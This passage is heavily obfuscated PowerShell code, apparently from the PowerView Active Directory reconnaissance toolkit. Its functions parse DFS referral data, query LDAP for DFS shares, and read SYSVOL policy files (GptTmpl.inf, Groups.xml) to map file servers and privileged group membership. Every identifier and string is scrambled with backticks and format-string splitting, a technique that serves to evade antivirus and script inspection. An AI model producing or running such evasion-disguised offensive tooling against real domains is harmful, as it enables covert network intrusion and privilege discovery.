                        ${shOr`T_PR`eFIx} =  ( vArIaBle  ("M1"+"Lc")  )."v`AluE"::"u`NiCoDE"."get`S`TrINg"(${B`LOB`_dA`Ta}[${sHOr`T_P`REfIx_`sTART}..${ShoR`T_pR`EFI`x_EnD}])

                        ${tYPE_S`T`ArT} = ${sHo`RT_`PReFiX`_EnD} + 1
                        ${tYpe_E`ND} = ${tYPE_S`T`ArT} + 3
                        ${Ty`pe} =   (  varIABlE  ("d9"+"X8")  -vaL )::"t`oUInt32"(${B`L`OB_`data}[${TYpe_s`T`Art}..${T`yPe`_e`ND}],0)

                        ${Stat`E_`stA`Rt} = ${T`Yp`e_eND} + 1
                        ${st`AT`E`_end} = ${stAtE`_s`T`ART} + 3
                        ${ST`A`TE} =   ${D9`x8}::"To`UINT`32"(${Bl`ob_da`TA}[${STat`E`_StaRt}..${STa`TE_`E`ND}],0)

                        ${COMMEnt`_`sIZE`_STarT} = ${ST`AtE_e`ND} + 1
                        ${cO`mmeNt`_siZe`_end} = ${CO`Mm`Ent_SI`Ze_stA`Rt} + 1
                        ${cOmMeN`T_`size} =  ${d9`x8}::"TOu`i`Nt16"(${b`LO`B_data}[${c`OmM`ENT_S`I`z`E_`sTArt}..${c`OmmE`NT_Si`Z`e_end}],0)
                        ${commen`T_sT`A`Rt} = ${COmM`EnT_sIZ`e_E`ND} + 1
                        ${c`OMm`E`Nt_enD} = ${coMME`Nt_`St`ART} + ${c`o`Mm`ent_S`iZe} - 1
                        if (${CoMm`EN`T_SI`ze} -gt 0)  {
                            ${COMmE`NT} =  ${M`1Lc}::"u`N`IcODE"."Gets`TrI`Ng"(${b`LoB_dA`TA}[${COM`Me`NT_s`TA`RT}..${COM`M`enT_eNd}])
                        }
                        ${P`REF`ix_Tim`Est`AmP_ST`ART} = ${C`oMmeN`T_`END} + 1
                        ${PRe`FIX_TiM`E`sTA`m`p_EnD} = ${pr`e`F`ix_tImE`ST`AmP_start} + 7
                        
                        ${PREfi`X_T`ImeStA`mP} = ${b`lob_`dAta}[${PR`ef`ix`_TiME`STa`Mp_STaRt}..${PR`EFI`x_time`sTamP_end}] 
                        ${S`TA`Te`_TimesTA`MP_St`A`RT} = ${p`R`E`FIx_timEsT`A`Mp_ENd} + 1
                        ${St`A`TE`_T`I`mEs`TamP_eNd} = ${s`TaTe_T`Im`esTa`mP_`STArT} + 7
                        ${S`Ta`TE_Time`stamP} = ${bL`oB_dA`Ta}[${stATe_T`imEStam`p_st`A`Rt}..${S`TaTE_TImE`stA`m`P_end}]
                        ${COmm`E`Nt_ti`MEstamP`_sTaRT} = ${STaT`E_T`i`mEstAMP_`ENd} + 1
                        ${CO`MMe`N`T_TIm`EsTAMp_E`ND} = ${cO`MM`EN`T_timeS`TamP`_`sTARt} + 7
                        ${cOMmeN`T_`TI`MESTA`Mp} = ${b`l`OB`_DATa}[${COM`mE`N`T_TIMEs`Ta`Mp`_st`ArT}..${cOMM`e`NT_ti`mes`TaM`p_EnD}]
                        ${VEr`SI`oN_`sTA`Rt} = ${COmmenT_`TImeSt`A`Mp_`eNd}  + 1
                        ${VerS`iON_e`ND} = ${VERsio`N_St`A`RT} + 3
                        ${V`eRs`IOn} =   ${D`9X8}::"TOU`IN`T32"(${b`l`ob_Da`TA}[${VeRsi`oN_ST`ARt}..${ve`RSIoN`_End}],0)

                        
                        ${dFs`_`T`A`RGETLIsT_b`loB_`s`iZ`e_`StARt} = ${ve`Rsion`_E`Nd} + 1
                        ${D`Fs_TARg`Etl`Ist_bL`OB_SIZ`e`_E`ND} = ${D`Fs_TargeTLIsT`_BLO`B`_sI`ze_sT`ART} + 3
                        ${dF`S_tA`RgET`LisT`_blOB_sIZE} =  ( GeT-vARiaBLE ("{1}{0}" -f 'X8','d9')  )."VAL`Ue"::"tou`InT`32"(${b`l`Ob_DaTa}[${D`F`s_Targe`TL`I`sT_BLo`B_SiZe_ST`ARt}..${D`Fs_`TARg`E`TList`_BLob_Si`ze`_`END}],0)

                        ${DfS_targ`e`TLi`s`T_bLOb_`StaRt} = ${DfS_T`AR`GeTlIst_bL`ob_`S`IzE_End} + 1
                        ${DfS_Tar`Ge`TLIst_B`lOb`_`end} = ${Dfs_tArGet`LI`St_`Bl`Ob`_staRt} + ${D`Fs`_`TA`RgETL`iST_BLo`B`_siZE} - 1
                        ${dfs_t`Ar`gET`Li`s`T_`BLob} = ${bL`ob_d`ATA}[${dfS_T`A`RG`EtlIST_b`lO`B`_START}..${dfS_t`ARg`e`T`lIS`T_blOb_e`Nd}]
                        ${res`eRvED`_b`L`ob_`sIze_sTArt} = ${dFS_TARgetl`IsT_b`lOB`_`EnD} + 1
                        ${rESERVeD_b`lob_sIZ`e`_E`ND} = ${Re`SE`RVEd_B`L`ob_SIZe_S`TaRt} + 3
                        ${RE`S`ErvEd_B`L`ob_`siZe} =   (  get-ChILDitEM ("{2}{1}{3}{0}"-f 'E:D9X8','R','vA','iABL') )."Va`LuE"::"TO`U`inT32"(${B`lo`B_D`ATa}[${R`eseRveD`_BlOb_Si`zE_`s`TART}..${rESE`RVeD_B`LoB`_`s`ize_E`ND}],0)

                        ${re`sER`Ve`d_blO`B_StA`Rt} = ${re`S`eR`VEd_blo`B_si`z`E_eNd} + 1
                        ${RE`sE`RVED_BLoB`_eNd} = ${R`ESERVed_`B`lOb_`STArT} + ${reS`E`R`VED_b`lOb_si`ZE} - 1
                        ${r`eSErVEd_`Blob} = ${bl`ob`_DATa}[${Res`Erved`_`Blob_sT`ARt}..${Res`eRv`eD_bl`o`B`_EnD}]
                        ${RE`FerrAl_`TtL_Sta`RT} = ${r`ESerV`E`D_blOb`_end} + 1
                        ${ReFERr`AL_t`Tl`_`EnD} = ${r`efE`RRA`L_`Ttl_stART} + 3
                        ${REFErRAL`_t`TL} =   (GEt-VariAblE  ("d9X"+"8")  -VALUeOnly )::"T`OUIn`T32"(${b`lo`B`_Data}[${REF`ERR`Al_T`Tl_S`T`Art}..${re`FERr`Al_`TTL`_END}],0)

                        
                        ${T`ARgeT_`COU`NT`_sT`ARt} = 0
                        ${taR`get_COUN`T`_E`Nd} = ${t`A`RGe`T_c`OUnT`_`sTaRt} + 3
                        ${tArget_`cou`Nt} =  ${D`9x8}::"TOuI`NT32"(${dFS_tar`gEt`l`i`s`T_bLob}[${tArGeT`_coUnt`_S`TaRT}..${TargEt_`cOU`Nt`_ENd}],0)
                        ${T`_o`FFsEt} = ${T`ARgET_CO`UN`T_eNd} + 1

                        for(${j}=1; ${J} -le ${T`ArgET_`CoU`NT}; ${J}++){
                            ${T`ArGe`T_entrY_siz`E_Sta`Rt} = ${T`_Of`FSet}
                            ${Tar`ge`T_ENT`Ry`_siZ`E_eND} = ${tA`RGeT_e`Nt`Ry_SizE_s`T`A`Rt} + 3
                            ${T`A`RGET`_E`NT`RY_sIze} =   ( VaRiABLE  ("{0}{1}" -f 'D9','x8') )."va`Lue"::"toUiN`T`32"(${DF`s_tar`g`etlisT`_BLoB}[${TARg`eT_En`Tr`y_sI`ZE_sTARt}..${ta`RgE`T_E`NT`RY`_sizE_ENd}],0)
                            ${tArgEt_Ti`m`e_s`TAMp`_StART} = ${t`Arg`eT_enTRy`_Siz`E`_End} + 1
                            ${TARG`E`T_`Time_stAM`P_`END} = ${TArGeT_`TI`me_ST`AMP_St`ART} + 7
                            
                            ${TARgeT`_`T`iME_sTAMp} = ${Dfs`_`T`ArGe`TlisT_BloB}[${tAr`gE`T_TImE_s`T`Amp_StArt}..${taRgeT_TI`Me_s`Ta`Mp_`eNd}]
                            ${tArgET_sT`AT`E_s`T`Art} = ${TA`R`Get_Ti`ME_`sTAmP_eNd} + 1
                            ${Tar`geT_S`TaT`e_EnD} = ${TaRGet`_`S`TAte_sT`ArT} + 3
                            ${T`A`RgeT_sTAtE} =   ( Ls ("{0}{1}{3}{2}" -f'vArI','Able','9x8',':D')  )."VAL`Ue"::"toU`In`T32"(${d`Fs_T`ArgeT`List_BloB}[${tARg`ET_s`TAT`e_StaRt}..${TaR`get_S`Ta`Te`_enD}],0)

                            ${taRge`T_TYpE`_St`ARt} = ${Ta`RG`et_STaTe_e`Nd} + 1
                            ${TARGet`_TY`PE_End} = ${TArgEt`_TyPE`_`staRt} + 3
                            ${t`ARgEt_t`yPe} =   (gI ("{0}{2}{1}{3}" -f'VA','aBl','rI','E:d9X8'))."v`ALuE"::"to`UInT`32"(${D`FS_tARGETlIST_`B`lob}[${TArGeT`_`TYPE`_StarT}..${tAr`g`et_TYPE_`E`Nd}],0)

                            ${S`ER`VER_NaM`e_sIZe_STA`RT} = ${tArGE`T_TYPe_`E`Nd} + 1
                            ${ServER_`NaME_`s`Ize_END} = ${serv`Er_NA`m`E`_`SIzE_StaRt} + 1
                            ${SerVEr_NAM`E_`S`izE} =   (VARIABLe  ("{1}{0}" -f '9X8','D')  )."VA`lue"::"Tou`INt16"(${dFs`_`TARGetL`ist_blOB}[${SER`V`eR_nA`Me_SIZ`e`_Start}..${seR`VEr_n`Ame`_`sIZe_`End}],0)

                            ${serVe`R_`NamE`_s`T`ArT} = ${SErV`ER_nAME_`siz`E_eNd} + 1
                            ${se`RVer_nAme`_`END} = ${s`E`Rv`ER_nAME_sTA`Rt} + ${s`ErveR_NaM`E_`S`IZE} - 1
                            ${S`er`VeR_NA`Me} =   (  vArIABle  ("{1}{0}" -f'1lC','m') -valuEO )::"u`NiC`OdE"."G`etSTrI`Ng"(${dfs_TAr`g`E`TL`IST`_blOb}[${sE`RVeR_N`AM`e_sTA`RT}..${sErVe`R_n`AME`_`EnD}])

                            ${SHA`Re_`NamE_sIz`e_`ST`ARt} = ${s`ervER_`NAMe_e`Nd} + 1
                            ${sHarE_`N`A`ME_S`I`zE_eNd} = ${SHA`RE`_naMe`_sIze_sT`ARt} + 1
                            ${s`Hare_N`AMe_`S`ize} =  (childiTEm  ("{1}{0}{2}" -f'RiaBLe','Va',':D9X8') )."V`ALuE"::"TOUinT`16"(${D`Fs`_t`ArGeT`LiS`T_BLob}[${SHA`RE_`Name`_siZE_`s`TA`RT}..${SH`Are_NA`Me_Size_`eND}],0)
                            ${s`Har`e_n`AMe_`s`TArT} = ${sHa`RE_N`Am`e_S`iZe_end} + 1
                            ${Sh`A`Re_NA`mE`_enD} = ${sHAre`_nA`mE_S`TaRt} + ${sH`ArE`_na`m`e_SiZe} - 1
                            ${SHaR`e_N`AmE} =  (  ITeM  ("{0}{2}{1}" -f'vArIABle:','1Lc','M')  )."V`Alue"::"u`Ni`CODe"."g`etStR`ing"(${d`FS`_TARGeTLisT`_blob}[${SHARE`_N`AmE_`s`Tart}..${SH`ARe`_NamE_`ENd}])

                            ${t`ARgEt`_li`ST} += "\\$server_name\$share_name"
                            ${t_oF`FseT} = ${S`HAre`_naMe_E`ND} + 1
                        }
                    }
                }
                ${OF`Fs`Et} = ${bLoB`_D`A`Ta_`EnD} + 1
                ${Df`S_pKt`_pROPER`Ti`eS} = @{
                    ("{1}{0}" -f'e','Nam') = ${Blo`B_N`AME}
                    ("{0}{1}"-f'P','refix') = ${PrE`F`ix}
                    ("{0}{1}{2}{3}"-f 'T','arge','tLis','t') = ${taRgE`T_L`iST}
                }
                ${oBj`e`CT_`LIst} += &("{2}{1}{0}" -f 'Object','w-','Ne') -TypeName ("{2}{1}{0}" -f't','jec','PSOb') -Property ${dfs_P`KT_pROp`e`Rt`IES}
                ${Pr`Ef`iX} = ${n`Ull}
                ${blO`B`_`NAME} = ${n`ULL}
                ${ta`Rg`ET_L`iSt} = ${N`Ull}
            }

            ${S`Erv`ERS} = @()
            ${objEc`T`_LiST} | &("{1}{0}{3}{4}{2}" -f'rE','Fo','ct','a','ch-Obje') {
                if (${_}."T`ARgE`TL`iSt") {
                    ${_}."TArge`T`L`ISt" | &("{2}{3}{0}{1}"-f '-Ob','ject','ForEa','ch') {
                        ${SERve`RS} += ${_}.("{0}{1}" -f'spl','it').Invoke('\')[2]
                    }
                }
            }

            ${seRVe`Rs}
        }

        function ge`T-dOMAin`dfs`s`H`AREV1 {
            [CmdletBinding()]
            Param(
                [String]
                ${doM`AiN},

                [String]
                ${S`eArcH`Ba`SE},

                [String]
                ${s`E`Rver},

                [String]
                ${s`ea`RchS`CoPE} = ("{1}{0}{2}"-f're','Subt','e'),

                [Int]
                ${r`eS`Ul`TpAGESiZe} = 200,

                [Int]
                ${sE`RVe`Rt`IM`elimIt},

                [Switch]
                ${t`OMbS`TONE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CRedEN`T`I`AL} =   ${7`Tq02}::"emP`Ty"
            )

            ${dfsS`eAR`c`heR} = &("{2}{4}{0}{1}{3}"-f'i','nSearch','Ge','er','t-Doma') @PSBoundParameters

            if (${df`SSeA`Rch`Er}) {
                ${DfsS`Ha`Res} = @()
                ${DFS`sEa`RcHeR}."FIl`TeR" = ("{0}{4}{1}{2}{3}"-f'(&(object','lass=fT','D','fs))','C')

                try {
                    ${Res`UL`Ts} = ${dfs`S`ea`RcheR}.("{0}{2}{1}"-f 'Fin','l','dAl').Invoke()
                    ${r`esUl`Ts} | &("{3}{0}{1}{2}" -f'here-Obj','ec','t','W') {${_}} | &("{2}{0}{1}"-f 'rEach-Ob','ject','Fo') {
                        ${pro`Pe`R`TieS} = ${_}."pRo`P`eR`Ties"
                        ${r`EM`O`TENAMeS} = ${pRoPert`i`Es}."r`EMOtEsErve`RNAmE"
                        ${P`kT} = ${pRo`Per`T`ieS}."P`kT"

                        ${d`FSs`HaReS} += ${R`eMO`TENAmeS} | &("{3}{0}{1}{2}" -f 'r','Each-Ob','ject','Fo') {
                            try {
                                if ( ${_}.("{2}{0}{1}" -f'nt','ains','Co').Invoke('\') ) {
                                    &("{1}{2}{0}" -f 'ect','Ne','w-Obj') -TypeName ("{2}{1}{0}" -f'ct','je','PSOb') -Property @{("{0}{1}" -f'N','ame')=${pro`PeR`TIes}."N`AMe"[0];("{1}{2}{3}{0}{4}" -f'e','Rem','oteSe','rv','rName')=${_}.("{1}{0}" -f 'lit','sp').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{0}{1}{2}"-f 'Write','-Verbo','se') ('[G'+'et'+'-D'+'oma'+'inDFSSha'+'r'+'e] '+'Get-DomainD'+'F'+'S'+'ShareV1 '+'erro'+'r '+'in'+' '+'p'+'ars'+'ing '+'D'+'FS '+'sh'+'are '+': '+"$_")
                            }
                        }
                    }
                    if (${r`eSuLts}) {
                        try { ${rE`sulTs}.("{0}{1}"-f 'dis','pose').Invoke() }
                        catch {
                            &("{0}{2}{3}{1}"-f 'Writ','se','e-Ve','rbo') ('[G'+'et-Doma'+'in'+'DFSS'+'ha'+'re] '+'Ge'+'t-Do'+'main'+'DFSShareV1 '+'er'+'ror '+'dispo'+'s'+'ing '+'of'+' '+'the'+' '+'R'+'esult'+'s '+'o'+'bject:'+' '+"$_")
                        }
                    }
                    ${D`FS`searC`HEr}.("{0}{2}{1}" -f'di','se','spo').Invoke()

                    if (${p`kT} -and ${P`KT}[0]) {
                        &("{1}{0}"-f 'rse-Pkt','Pa') ${p`Kt}[0] | &("{0}{1}{3}{2}{4}" -f'Fo','rE','jec','ach-Ob','t') {
                            
                            
                            
                            if (${_} -ne ("{1}{0}"-f 'ull','n')) {
                                &("{3}{0}{2}{1}"-f 'Ob','ct','je','New-') -TypeName ("{0}{1}{2}"-f 'P','S','Object') -Property @{("{0}{1}" -f 'Nam','e')=${pR`O`PERTIEs}."nA`Me"[0];("{2}{3}{1}{4}{0}"-f'me','oteS','R','em','erverNa')=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{0}{1}{2}"-f 'Writ','e-War','ning') ('[G'+'et-'+'D'+'omainDFS'+'Share]'+' '+'Get-Domai'+'nDFSSh'+'are'+'V'+'1'+' '+'er'+'ro'+'r '+': '+"$_")
                }
                ${dF`Ss`HArEs} | &("{2}{1}{0}" -f 'ect','-Obj','Sort') -Unique -Property ("{0}{1}{2}{3}{4}"-f 'Re','mo','teServer','Nam','e')
            }
        }

        function gE`T-d`OmaI`NdFSSHarEv2 {
            [CmdletBinding()]
            Param(
                [String]
                ${DOm`AIn},

                [String]
                ${S`EarChba`SE},

                [String]
                ${S`Erv`Er},

                [String]
                ${SeArc`hSc`opE} = ("{1}{0}" -f'ubtree','S'),

                [Int]
                ${RES`ULtPaGe`Si`Ze} = 200,

                [Int]
                ${S`ERVEr`T`I`meLiM`IT},

                [Switch]
                ${To`m`BStOne},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${cREde`N`Ti`Al} =  (  vArIable ('7t'+'q02') )."VAl`Ue"::"e`MPtY"
            )

            ${DFs`S`eARcHeR} = &("{2}{4}{3}{0}{1}" -f 'arche','r','Get-Doma','e','inS') @PSBoundParameters

            if (${D`FsSEa`RCHeR}) {
                ${DFss`HAr`eS} = @()
                ${DfSSE`A`RCH`eR}."f`IltEr" = ((("{4}{1}{3}{6}{5}{0}{2}" -f'kv2)','t',')','Class=','(&(objec','S-Lin','msDF')))
                ${nu`ll} = ${DFSS`e`A`RCHER}."PropER`TI`EStOL`oaD".("{0}{1}"-f 'AddR','ange').Invoke((("{2}{0}{4}{1}{3}" -f'-','ath','msdfs','v2','linkp'),("{2}{3}{1}{0}" -f 'Listv2','get','msDFS','-Tar')))

                try {
                    ${Re`s`ULTS} = ${dfS`se`Ar`CHer}.("{1}{0}"-f'All','Find').Invoke()
                    ${rE`SUL`Ts} | &("{1}{2}{3}{0}"-f'Object','W','he','re-') {${_}} | &("{3}{2}{4}{1}{0}"-f 't','c','rEa','Fo','ch-Obje') {
                        ${pr`oP`eRties} = ${_}."pR`OperTI`eS"
                        ${T`A`RGET_LISt} = ${prOpE`Rt`Ies}.'msdfs-targetlistv2'[0]
                        ${X`ml} = [xml]  ${M1`LC}::"Un`ic`ode"."geT`sTRI`Ng"(${tAR`get_L`IsT}[2..(${T`AR`g`eT_LIst}."L`En`GTh"-1)])
                        ${dFSS`HAR`eS} += ${x`Ml}."TA`R`gets"."chiL`dnO`dES" | &("{2}{3}{1}{0}"-f'ect','h-Obj','Fo','rEac') {
                            try {
                                ${TA`RgeT} = ${_}."INn`E`RtExT"
                                if ( ${TAR`GeT}.("{0}{1}"-f'Contain','s').Invoke('\') ) {
                                    ${DFs`R`Oot} = ${T`ArGet}.("{1}{0}" -f 'plit','s').Invoke('\')[3]
                                    ${sHa`Re`Name} = ${P`ROPE`RtIES}.'msdfs-linkpathv2'[0]
                                    &("{1}{0}{2}"-f 'w-','Ne','Object') -TypeName ("{0}{2}{1}" -f 'P','ct','SObje') -Property @{("{0}{1}" -f 'N','ame')="$DFSroot$ShareName";("{2}{3}{0}{1}"-f'Nam','e','Remot','eServer')=${tAR`G`eT}.("{0}{1}" -f'spli','t').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{1}{0}{2}{3}"-f'te-','Wri','Verbos','e') ('[Get-D'+'o'+'m'+'ainDFSShare'+'] '+'Get-D'+'omai'+'n'+'D'+'F'+'SSha'+'reV2 '+'er'+'r'+'or '+'in'+' '+'par'+'sing'+' '+'targ'+'et '+': '+"$_")
                            }
                        }
                    }
                    if (${R`Es`UlTs}) {
                        try { ${reS`ULTS}.("{1}{2}{0}"-f'ose','dis','p').Invoke() }
                        catch {
                            &("{1}{2}{4}{0}{3}" -f's','Write-V','erb','e','o') ('[Get-Domai'+'nDFS'+'Sha'+'r'+'e'+'] '+'Error'+' '+'d'+'isposing'+' '+'of'+' '+'t'+'he '+'Res'+'u'+'lts '+'ob'+'ject:'+' '+"$_")
                        }
                    }
                    ${dFsS`EA`R`ChEr}.("{0}{2}{1}" -f'd','e','ispos').Invoke()
                }
                catch {
                    &("{0}{2}{3}{1}{4}"-f 'W','rni','rite-','Wa','ng') ('[Get-Doma'+'in'+'DFSSha'+'r'+'e'+'] '+'Ge'+'t-D'+'om'+'ainDF'+'SShar'+'eV2 '+'er'+'ror'+' '+': '+"$_")
                }
                ${d`FSS`hA`ReS} | &("{2}{1}{0}{3}" -f '-','rt','So','Object') -Unique -Property ("{0}{1}{3}{4}{2}"-f'R','em','Name','ote','Server')
            }
        }
    }

    PROCESS {
        ${dF`ssH`AREs} = @()

        if (${p`sbo`UNd`PaRAmeTeRs}[("{0}{1}" -f 'D','omain')]) {
            ForEach (${T`ARGet`dOMA`IN} in ${D`omAiN}) {
                ${seARCHe`R`AR`GuMen`Ts}[("{0}{1}"-f'Dom','ain')] = ${tA`RgETd`O`M`AIN}
                if (${v`eRS`IoN} -match ((("{2}{0}{1}" -f 'l{0}','1','al')) -f[Char]124)) {
                    ${DFssHA`R`Es} += &("{0}{2}{4}{3}{1}"-f 'Get-Do','1','mainDFSSh','V','are') @SearcherArguments
                }
                if (${VeRsi`oN} -match ((("{2}{0}{1}" -f'l6','dh2','al'))  -rEplaCe  '6dh',[CHAR]124)) {
                    ${DFSs`HA`ReS} += &("{2}{4}{5}{3}{1}{0}" -f'SShareV2','DF','Get-D','ain','o','m') @SearcherArguments
                }
            }
        }
        else {
            if (${VEr`Si`oN} -match ((("{2}{0}{1}{3}" -f'P','B6','all','1'))-CrEPlacE'PB6',[ChaR]124)) {
                ${Df`SS`HARes} += &("{2}{5}{1}{3}{4}{0}" -f '1','m','Get-','ainDFSShare','V','Do') @SearcherArguments
            }
            if (${VER`S`IoN} -match ((("{1}{0}" -f 'I2','all9a')) -crEPLace'9aI',[ChAr]124)) {
                ${DfS`SH`ARES} += &("{1}{0}{2}{4}{3}" -f'Do','Get-','mainDFS','V2','Share') @SearcherArguments
            }
        }

        ${Df`SSH`ARES} | &("{0}{1}{2}{3}"-f 'S','o','rt-O','bject') -Property (("{1}{0}{4}{2}{3}"-f 'te','Remo','ve','rName','Ser'),("{0}{1}"-f 'N','ame')) -Unique
    }
}








function G`ET-gpt`T`MpL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{4}{2}" -f'PSSh','ldPr','cess','ou','o'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(MAnDaToRy = ${TR`Ue}, vALUefrOmpipEline = ${Tr`UE}, vaLUefroMPiPeLInEbYPrOPERTyNAmE = ${t`Rue})]
        [Alias({"{1}{2}{0}{3}" -f'at','gpcfi','lesysp','h'}, {"{0}{1}"-f 'Pat','h'})]
        [String]
        ${GPTt`m`plp`AtH},

        [Switch]
        ${OUTp`U`ToBJEcT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDEnTI`Al} =   ${7T`Q02}::"em`PtY"
    )

    BEGIN {
        ${m`A`ppeDpA`ThS} = @{}
    }

    PROCESS {
        try {
            if ((${G`pTTM`pL`PAtH} -Match ((("{5}{4}{3}{2}{6}{1}{0}" -f '.*','Qz','g','QzgQz.*','g','gQzgQz','Qzg'))  -CrePlACe'gQz',[ChAr]92)) -and (${PS`BOunD`P`A`RAMETe`Rs}[("{0}{1}{2}"-f'Crede','ntia','l')])) {
                ${SY`s`VOLPatH} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not ${mAPpEd`pa`THS}[${Sys`V`OLPa`Th}]) {
                    
                    &("{2}{1}{0}{3}{4}"-f'Remote','-','Add','Con','nection') -Path ${Sy`SVol`PA`TH} -Credential ${cr`EDe`Nt`ial}
                    ${MAP`p`EDPaThS}[${s`Y`SvOLpATh}] = ${T`RUe}
                }
            }

            ${T`AR`GeTG`p`TTMPLPaTh} = ${Gp`T`TmplPATH}
            if (-not ${Ta`R`GEtGP`TTMP`l`PATH}.("{1}{2}{0}" -f 'th','En','dsWi').Invoke(("{0}{1}"-f'.in','f'))) {
                ${t`A`RGeTGpTT`mplP`AtH} += ((("{2}{4}{6}{12}{10}{9}{8}{3}{1}{5}{0}{11}{7}" -f 'itz','IcSecE','zIcM','ows NTz','ACHINE','d','zI','nf','nd','crosoftzIcWi','i','IcGptTmpl.i','cM')).("{0}{1}{2}" -f 'R','eP','LACe').Invoke('zIc','\'))
            }

            &("{2}{4}{1}{0}{3}" -f 'e-Ver','it','W','bose','r') ('[Ge'+'t-'+'GptT'+'mpl] '+'P'+'arsing '+'GptTmplPa'+'t'+'h:'+' '+"$TargetGptTmplPath")

            if (${PsB`o`UNdP`ARaM`eTeRS}[("{1}{3}{0}{2}" -f 'put','O','Object','ut')]) {
                ${cO`Nt`eNtS} = &("{1}{2}{0}"-f 'ent','Get-IniCo','nt') -Path ${t`ArgEtGpTtmPlP`A`Th} -OutputObject -ErrorAction ("{1}{0}" -f'top','S')
                if (${CONt`E`Nts}) {
                    ${C`O`N`TentS} | &("{2}{0}{1}"-f 'emb','er','Add-M') ("{2}{3}{1}{0}"-f'ty','r','Noteprop','e') ("{0}{1}" -f'Pat','h') ${t`ARGe`T`GPTt`MP`lpATH}
                    ${C`ont`e`Nts}
                }
            }
            else {
                ${co`NT`EntS} = &("{0}{1}{2}{3}"-f'Get-I','niCon','t','ent') -Path ${TaRGETGP`TTMPL`p`ATh} -ErrorAction ("{0}{1}" -f 'Sto','p')
                if (${CoNt`E`NTs}) {
                    ${COnT`Ents}[("{0}{1}"-f'Pat','h')] = ${TA`R`gEt`g`PttmpLpath}
                    ${Co`NtEN`TS}
                }
            }
        }
        catch {
            &("{0}{2}{3}{1}"-f'Wr','Verbose','it','e-') ('['+'Get-Gpt'+'Tm'+'pl] '+'Err'+'o'+'r '+'pa'+'rsi'+'ng '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        
        ${mApp`e`dpAT`hS}."KE`yS" | &("{2}{1}{3}{0}" -f'bject','ch-','ForEa','O') { &("{4}{2}{0}{1}{3}" -f'n','ne','RemoteCo','ction','Remove-') -Path ${_} }
    }
}


function ge`T-GRoU`PsxMl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}" -f 'ldPro','cess','SShou','P'}, '')]
    [OutputType({"{2}{3}{0}{1}"-f 'ou','psXML','PowerVie','w.Gr'})]
    [CmdletBinding()]
    Param (
        [Parameter(ManDaTOrY = ${t`Rue}, VALUEFRompiPeLInE = ${TR`UE}, vALuEFrOMpiPELiNEbYProPERtYNAME = ${tR`Ue})]
        [Alias({"{1}{0}"-f'h','Pat'})]
        [String]
        ${gR`oUpsXM`L`P`ATh},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`DentiAL} =  (vAriaBle  ("{0}{1}"-f'7','tQ02')  -vAl )::"eM`PTY"
    )

    BEGIN {
        ${m`APpED`p`AthS} = @{}
    }

    PROCESS {
        try {
            if ((${g`RoU`psxmLpAth} -Match ((("{4}{2}{5}{3}{6}{1}{0}" -f'.*','OH9','H9OH','H9O','O','9O','H9.*OH9')).("{2}{1}{0}"-f'ce','ePla','r').Invoke('OH9','\'))) -and (${psBou`NdPa`Ra`me`Te`Rs}[("{0}{1}{2}{3}" -f'Cre','de','ntia','l')])) {
                ${SYsV`OLP`ATH} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not ${MAPP`edPAt`hs}[${s`ySVO`LP`AtH}]) {
                    
                    &("{5}{1}{4}{0}{3}{6}{2}" -f 'e','-R','on','Connect','emot','Add','i') -Path ${s`YS`V`OlpaTH} -Credential ${CrE`D`ent`iAL}
                    ${M`AppedP`AtHS}[${Sys`VOlP`ATh}] = ${T`Rue}
                }
            }

            [XML]${G`R`oUP`sXMlCoNtENT} = &("{3}{2}{0}{1}" -f 'onten','t','C','Get-') -Path ${GrOUPsx`m`LpaTh} -ErrorAction ("{0}{1}" -f'S','top')

            
            ${g`R`oU`psX`mlCoNtENt} | &("{2}{1}{0}"-f 'l','ct-Xm','Sele') ("{0}{2}{1}"-f '/Groups/Gr','up','o') | &("{0}{3}{1}{2}" -f 'Se','bj','ect','lect-O') -ExpandProperty ("{0}{1}" -f 'n','ode') | &("{3}{2}{0}{1}"-f'-Obj','ect','ach','ForE') {

                ${grou`PNa`ME} = ${_}."PRo`PErt`iEs"."GRou`P`NAMe"

                
                ${groUp`S`Id} = ${_}."PROp`er`TiES"."G`RoU`psiD"
                if (-not ${g`ROU`PsiD}) {
                    if (${G`Ro`UpnAMe} -match ("{2}{1}{0}"-f'istrators','n','Admi')) {
                        ${Grou`P`S`ID} = ("{1}{2}{0}" -f '-544','S-1-5','-32')
                    }
                    elseif (${Gro`U`pN`AmE} -match ("{0}{2}{1}{3}"-f 'Remote','t',' Desk','op')) {
                        ${gR`ou`pSID} = ("{0}{2}{1}{3}"-f'S','1-5-32-5','-','55')
                    }
                    elseif (${gr`oUp`NA`me} -match ("{2}{0}{1}"-f's','ts','Gue')) {
                        ${gR`OUp`SId} = ("{0}{2}{1}{3}"-f'S','-5-3','-1','2-546')
                    }
                    else {
                        if (${PsbO`UND`pA`R`A`meTers}[("{2}{1}{0}" -f 'tial','eden','Cr')]) {
                            ${grO`U`PsId} = &("{1}{0}{2}" -f 'onvert','C','To-SID') -ObjectName ${gro`U`pnAme} -Credential ${crE`DE`NTIAL}
                        }
                        else {
                            ${GR`Oup`sID} = &("{2}{3}{0}{1}"-f'ertTo-','SID','Co','nv') -ObjectName ${g`ROupn`Ame}
                        }
                    }
                }

                
                ${M`EmB`ErS} = ${_}."pro`pE`RTIES"."m`E`MBErs" | &("{1}{2}{0}" -f 'ct','Select','-Obje') -ExpandProperty ("{1}{0}" -f 'ber','Mem') | &("{2}{0}{1}{3}" -f'er','e','Wh','-Object') { ${_}."A`CtION" -match 'ADD' } | &("{2}{3}{4}{0}{1}"-f'-','Object','F','orEac','h') {
                    if (${_}."s`Id") { ${_}."S`iD" }
                    else { ${_}."n`AMe" }
                }

                if (${MEMb`e`RS}) {
                    
